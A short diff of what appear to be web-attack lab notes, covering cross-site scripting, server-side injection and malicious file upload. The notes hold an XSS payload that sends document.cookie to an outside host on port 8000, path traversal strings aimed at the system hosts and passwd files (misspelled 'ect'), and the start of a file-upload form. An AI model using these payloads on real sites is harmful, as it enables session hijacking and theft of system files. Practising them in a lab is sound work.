@@ -1,12 +1,16 @@
-    10.50.29.184/path/pathdemo.php
-    10.50.29.184/cmdinjectdemo.php
+    10.50.X.X/path/pathdemo.php
+    10.50.X.X/cmdinjectdemo.php
 ________________________________________________________________________________________________________________
     <script>document.location="http://10.50.21.223:8000"+document.cookie;</script>
 ________________________________________________________________________________________________________________
+## Server-Side injection
 ## Post method: 
     ../../../../../../ect/hosts
     ../../../../../../ect/passwd
 ________________________________________________________________________________________________________________
+### 1: place to upload
+### 2: access to upload
+### 3: call to upload
 ## Malicious File Upload: 
     <HTML><BODY>
     <FORM METHOD="GET" NAME="myform" ACTION="">
